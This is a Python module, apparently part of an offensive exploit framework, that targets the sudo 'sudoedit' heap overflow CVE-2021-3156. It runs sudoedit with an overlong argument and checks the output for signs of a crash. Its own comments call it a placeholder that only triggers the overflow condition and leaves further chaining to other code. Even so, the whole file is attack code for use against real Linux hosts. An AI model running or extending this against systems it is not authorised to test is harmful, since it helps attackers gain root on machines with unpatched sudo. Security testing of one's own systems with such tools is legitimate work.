import subprocess

def run(container=None, simulate=False):
    print("[*] Running sudoedit Heap Overflow Exploit (CVE-2021-3156)...")

    if simulate:
        print("[SIMULATE] Would run crafted sudoedit argument to trigger heap overflow.")
        return "Simulated sudoedit overflow run."

    try:
        # Placeholder for real exploit logic
        # This command is based on public PoC structure to trigger the overflow
        overflow_arg = "A" * 10000  # overly long string to cause overflow in vulnerable sudo

        result = subprocess.run(
            ["sudoedit", "-s", overflow_arg],
            capture_output=True,
            text=True
        )

        if "Segmentation fault" in result.stderr or "malloc" in result.stderr:
            print("[+] Exploit triggered potential overflow condition.")
            return "Exploit may have triggered overflow. Further action or chaining required."
        else:
            return f"Exploit executed, but no obvious crash: {result.stderr.strip()}"

    except Exception as e:
        return f"Exploit failed: {str(e)}"